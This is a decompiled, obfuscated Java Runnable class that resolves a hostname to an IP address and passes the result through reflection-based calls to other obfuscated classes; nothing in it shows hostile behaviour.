import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.UnknownHostException;

class J5 implements Runnable {
   final String Q;
   final F5 c;

   J5(F5 var1, String var2) {
      this.c = var1;
      this.Q = var2;
   }

   @Override
   public void run() {
      try {
         Object[] var10000 = com.c.a(InetAddress.getByName((String)com.c.c(263547688617831596L).get(this)).getHostAddress());
         Method var5 = com.c.d(602697815696322216L);
         Object[] var12 = var10000;
         Object var9 = null;

         try {
            var10000 = (zh_2)var5.invoke(var9, var12);
         } catch (InvocationTargetException var3) {
            throw var3.getTargetException();
         }

         zh_2 var1 = var10000;
         var10000 = (Object[])com.c.c(474524358810565567L).get(com.c.c(558489952055562116L).get(this));
         var9 = com.c.a(var1);
         Method var10003 = com.c.d(452301227209549294L);
         var12 = (Object[])var9;
         var9 = var10000;
         Method var8 = var10003;

         try {
            var8.invoke(var9, var12);
         } catch (InvocationTargetException var2) {
            throw var2.getTargetException();
         }
      } catch (UnknownHostException var4) {
         var4.printStackTrace();
      }
   }
}





